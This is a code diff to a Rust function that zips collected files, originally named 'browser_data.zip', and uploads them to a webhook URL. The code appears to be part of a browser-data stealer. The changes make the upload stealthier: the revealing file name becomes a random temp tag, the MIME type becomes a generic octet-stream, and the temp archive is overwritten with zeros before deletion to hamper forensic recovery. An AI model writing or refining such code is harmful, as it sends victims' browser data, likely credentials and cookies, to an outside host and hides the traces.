@@ -1,5 +1,13 @@
-use std::{env, fs, io::Write};
+use std::{env, fs, io::Write, time::{SystemTime, UNIX_EPOCH}};
 use zip::write::FileOptions;
+
+fn temp_tag() -> String {
+    let nanos = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_nanos();
+    format!("{:x}{:x}", std::process::id(), nanos)
+}
 
 pub async fn send_zip(
     client: &reqwest::Client,
@@ -10,8 +18,9 @@ pub async fn send_zip(
         return Ok(());
     }
 
-    let zip_path = env::temp_dir().join("browser_data.zip");
-    crate::log::log(&format!("zip building: {} entries", files.len()));
+    let tag = temp_tag();
+    let zip_path = env::temp_dir().join(format!("{tag}.tmp"));
+    crate::logf!("zip building: {} entries", files.len());
 
     {
         let file = fs::File::create(&zip_path)?;
@@ -28,23 +37,30 @@ pub async fn send_zip(
     }
 
     let zip_data = fs::read(&zip_path)?;
-    crate::log::log(&format!("zip size: {} bytes", zip_data.len()));
+    crate::logf!("zip size: {} bytes", zip_data.len());
 
     let part = reqwest::multipart::Part::bytes(zip_data)
-        .file_name("browser_data.zip")
-        .mime_str("application/zip")?;
+        .file_name(format!("{tag}.tmp"))
+        .mime_str("application/octet-stream")?;
 
     let form = reqwest::multipart::Form::new().part("file", part);
 
     let response = client.post(webhook_url).multipart(form).send().await?;
     let status = response.status();
     let body = response.text().await.unwrap_or_default();
-    crate::log::log(&format!("webhook zip send: HTTP {status}"));
+    crate::logf!("webhook zip send: HTTP {status}");
     if !status.is_success() {
-        crate::log::log(&format!("webhook zip body: {body}"));
+        crate::logf!("webhook zip body: {body}");
+        let _ = fs::remove_file(&zip_path);
         return Err(format!("webhook failed: {status} {body}").into());
     }
 
+    if let Ok(meta) = fs::metadata(&zip_path) {
+        let len = meta.len().min(16 * 1024 * 1024) as usize;
+        if len > 0 {
+            let _ = fs::write(&zip_path, vec![0u8; len]);
+        }
+    }
     let _ = fs::remove_file(&zip_path);
 
     Ok(())
